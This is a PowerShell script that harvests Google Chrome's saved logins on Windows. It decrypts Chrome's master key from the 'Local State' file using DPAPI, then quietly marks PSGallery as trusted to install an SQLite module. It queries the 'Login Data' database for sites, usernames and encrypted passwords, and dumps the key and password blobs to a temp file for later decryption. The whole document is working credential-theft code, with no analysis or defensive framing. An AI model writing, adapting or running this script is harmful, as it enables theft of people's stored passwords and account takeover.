Add-Type -AssemblyName System.Security
Add-Type -AssemblyName System.Text.Encoding

$User = (Get-WMIObject -Class Win32_ComputerSystem).username -replace '.+\\'
$BaseFilePath = 'C:\Users\' + $User + '\AppData\Local'
$TempFile = $BaseFilePath + '\Temp\PowerOut.txt'

$LocalStatePath = $BaseFilePath + '\Google\Chrome\User Data\Local State'

$LocalState = Get-Content -Raw -Path $LocalStatePath | ConvertFrom-Json
$EncodedKey = [System.Convert]::FromBase64String($LocalState.os_crypt.encrypted_key)
$EncodedKeyCorrectSize = $EncodedKey[5..($EncodedKey.length-1)]
Write-Output([System.Convert]::ToBase64String($EncodedKeyCorrectSize))
[System.Convert]::ToBase64String([Security.Cryptography.ProtectedData]::Unprotect($EncodedKeyCorrectSize, $null, [Security.Cryptography.DataProtectionScope]::LocalMachine)) |  Out-File -FilePath $TempFile

Set-PSRepository -name 'PSGallery' -InstallationPolicy Trusted

Install-Module -Scope CurrentUser PSSQLite
#Import the module, create a data source and a table
Import-Module PSSQLite

$Database = $BaseFilePath + '\Google\Chrome\User Data\Default\Login Data'
$Query = 'SELECT origin_url, username_value, password_value FROM logins'

# We have a database, and a table, let's view the table info
$data = Invoke-SqliteQuery -DataSource $Database -Query $Query

# $line = 'Origin URL`t Username `t Password';
for ($i = 0; $i -lt $data.Count; $i++) {
    
    $EncryptedBytes =  $data[$i].password_value

    # Write-Output([System.Convert]::ToBase64String($EncryptedBytes))

    $EncryptedBytesCorrectSize = $EncryptedBytes[3..($EncryptedBytes.length - 1)]

    [System.Convert]::ToBase64String($EncryptedBytesCorrectSize) | Out-File -FilePath $TempFile -Append

    # $line = $data[$i].origin_url + '`t' + $data[$i].username_value + '`t' + $data[$i].password_value

    # Add-Content 'PasswordValues.txt' $line
    # Add-Content 'PasswordValues.txt' ''+$data[$i].password_value

}